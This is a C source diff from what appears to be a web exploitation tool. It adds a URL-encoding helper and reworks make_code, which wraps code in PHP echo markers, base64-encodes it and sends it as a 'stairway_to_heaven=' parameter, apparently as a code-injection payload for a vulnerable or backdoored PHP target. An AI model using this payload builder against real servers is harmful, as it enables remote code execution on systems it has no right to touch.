@@ -11,7 +11,7 @@ static void xlate(unsigned char *in, unsigned char *out){
 }
 
 char *b64_encode(const char *x){
-	char *encoded_str = NULL;
+	char *encoded_str = NULL, *ret = NULL;
 	size_t size_str = 0, n = 0, pos = 0, i = 0;
 	uint8_t b[3], c[4];
 
@@ -75,7 +75,10 @@ char *b64_encode(const char *x){
 	}
 
 	encoded_str[pos] = 0x0;
-	return encoded_str;
+	ret = urlencode(encoded_str);
+	xfree(encoded_str);
+
+	return ret;
 
 }
 
@@ -138,6 +141,44 @@ bool b64_decode(const char *encode, char **output){
 
 	(*output)[j] = 0x0;
 	return true;
+}
+
+char *urlencode(const char *enc){
+	int i, j, len;
+	char *ret, x;
+
+	static const char hextable[]="0123456789abcdef";
+
+	ret=xmalloc(1);
+	len=1;
+
+	for(i=0, j=0; enc[i]; i++, j++){
+		x = enc[i];
+		len++;
+		ret = xrealloc(ret, len);
+
+		if( (x >= 'a' && x <= 'z') ||
+		    (x >= 'A' && x <= 'Z')
+		){
+			ret[j] = x;
+		}
+
+		else {
+			len += 2;
+			ret = xrealloc(ret, len);
+			ret[j] = '%';
+
+			ret[j+1] = hextable[((x/16)%16)];
+			ret[j+2] = hextable[x%16];
+
+			j+=2;
+		}
+	}
+
+	ret[j] = 0x0;
+
+	return ret;
+
 }
 
 static size_t GetElements(const char *str){
@@ -491,8 +532,8 @@ void build_regex(char regex[], char *r_str, char *middle){
 }
 
 char *make_code(const char *mark, const char *code, bool auth){
-	char *ret = NULL, *lol=NULL, *encode_auth=NULL, *xpl_auth;
-	size_t len = 0,encode_auth_len;
+	char *ret = NULL, *b64x=NULL, *xpl_auth;
+	size_t len = 0, encode_auth_len;
 
 	if(!auth){
 		len = strlen(mark)*2+strlen(code)+2;
@@ -501,18 +542,20 @@ char *make_code(const char *mark, const char *code, bool auth){
 	} else {
 		ret = xmalloc( strlen(mark)*2+17*2+strlen(code)+2 );
 		sprintf(ret, "<?php echo \"%s\"; ?>%s<?php echo \"%s\"; ?>", mark, code, mark);
-		lol = b64_encode(ret);
-        encode_auth_len  = strlen(lol);
-        encode_auth = curl_easy_escape(NULL, lol, encode_auth_len);
+		b64x = b64_encode(ret);
 
-        encode_auth_len = strlen(encode_auth)+18+1;
-        xpl_auth = strcpy( xmalloc( (encode_auth_len+1) ), "stairway_to_heaven=");
-        strcat(xpl_auth, encode_auth);
-        xfree(encode_auth);
+		//encode_auth_len  = strlen(lol);
+		//encode_auth = urlencode(lol);
+
+		encode_auth_len = strlen(b64x)+18+1;
+
+		xpl_auth = strcpy( xmalloc( (encode_auth_len+1) ), "stairway_to_heaven=");
+		strcat(xpl_auth, b64x);
+
+		//xfree(encode_auth);
 		xfree(ret);
-		xfree(lol);
+		xfree(b64x);
 		return xpl_auth;
-
 	}
 
 	return ret;
